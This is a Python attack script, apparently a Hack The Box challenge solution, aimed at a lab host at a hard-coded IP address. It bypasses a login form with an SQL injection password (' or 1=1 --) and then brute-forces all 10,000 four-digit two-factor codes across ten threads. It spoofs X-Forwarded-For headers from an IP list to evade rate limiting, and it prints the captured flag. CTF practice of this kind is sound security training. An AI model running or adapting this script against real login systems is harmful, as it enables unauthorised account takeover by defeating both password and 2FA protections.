import requests
import re
import random
from concurrent.futures import ThreadPoolExecutor

def auth():
    s = requests.Session()
    req = requests.Request(method='POST', url="http://94.237.56.188:41500/auth/./login", data={'username':'admin', 'password':"' or 1=1 --"})
    prep =  req.prepare()
    prep.url = "http://94.237.56.188:41500/auth/./login"
    response = s.send(prep, verify=False)
    return s

def generate_pins():
    pins = [f"{i:04}\n" for i in range(10000)]
    random.shuffle(pins)
    with open("pins.txt", "w") as file:
        file.writelines(pins)

def crack_code():
    pins = open("pins.txt","r").readlines()
    ips = open("ips.txt","r").readlines()

    session = auth()
    count = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for pin in pins:
            future = executor.submit(crack_pin, session, pin.strip(), ips[count//20].strip())
            futures.append(future)
            count+=1
        
        for future in futures:
            response = future.result()
            if "Invalid" not in response.text:
                print(response.text)
                flag = re.search("HTB{.*}",session.get("http://94.237.56.188:41500/dashboard").text)
                if flag != None:
                    print(flag.group)
                executor.shutdown()
                exit(1)

def crack_pin(session, pin, ip):
    response = session.post("http://94.237.56.188:41500/auth/verify-2fa", data={'2fa-code': pin}, headers={'X-Forwarded-For':ip})#, proxies={'http':'127.0.0.1:8080','https':'127.0.0.1:8080'})
    return response

#generate_pins()
crack_code()
